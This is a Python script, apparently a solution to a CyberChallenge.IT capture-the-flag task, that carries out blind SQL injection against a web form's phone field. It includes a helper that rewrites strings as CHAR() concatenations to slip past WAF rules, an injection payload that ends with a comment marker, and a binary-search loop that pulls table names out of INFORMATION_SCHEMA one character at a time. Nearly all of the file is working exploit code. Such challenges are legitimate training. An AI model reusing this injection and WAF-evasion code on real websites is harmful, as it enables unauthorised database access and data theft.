import requests

def S(string):
    """ turns a string into a quoteless string that bypasses waf rules """
    return "CONCAT("+charify(string)+")"

def charify(string):
  string_without_first_char = string[1:]
  first_char = string[0]
  result = "CHAR({})".format(ord(first_char))
  for c in string_without_first_char:
    result += ",CHAR({})".format(ord(c))
  return result

def query(query):
    """ Execute a sql query
    return the sql error, or 0 if none was generated
    1048: cant be null
    1064: syntax error
    0:    no sql error returned
    """
    url = 'http://modinsecurity.challs.cyberchallenge.it:80/'
    myobj = {'name': '', 'email': '', 'phone': query, 'message': ''}
    x = requests.post(url, data = myobj)
    if "MySQL Error" in x.text:
        errline = x.text.split("\n")[0]
        errCode = errline.split(" ")[-1][0:4]
        return errCode
    return "0"

def binsearch(binTest):
    """ Decorator function, that facilitates binary serch queries 
    @argument: a function(char givenChar, int givenPosition) that must execute
               a query and return true if the char at the given position 
               is < of the given char
    @returns: a function(int startIndex=0) that will execute a binary search,
              printing the result in real time
    """
    def retFunc(startIndex=0):
        def binWalk(i):
            span = []
            for c in range(ord(','), ord('}')+1):
                span.append(chr(c))
            while len(span) >= 2:
                middle = len(span)//2
                if binTest(span[middle], i):
                    span = span[:middle]
                else:
                    span = span[middle:]
            return span[0]

        res = ""
        retCommaCount = 0
        i = startIndex
        while retCommaCount < 5:
            i += 1
            print("searching letter ant index ", i)
            resC = binWalk(i)
            if resC == ",":
                retCommaCount += 1
            else:
                retCommaCount = 0
            res  += resC
            print("==found== ",res)
    return retFunc


@binsearch
def get_all_tables(confront_char, positionInString):
    confront_char = ord(confront_char) #use for binary sarch
    get_char = f"(SELECT ORD(SUBSTRING(group_concat(TABLE_NAME), {positionInString},1)) FROM INFORMATION_SCHEMA.tables WHERE table_schema = DATABASE() )"
    boolean_oracle = f"if(( {get_char} < {confront_char} ), char(43), null)"
    q= f"asd\\' LIKE {boolean_oracle} ) -- ' or 1=1 "
    ret = query(q)
    return ret == "0"

get_all_tables()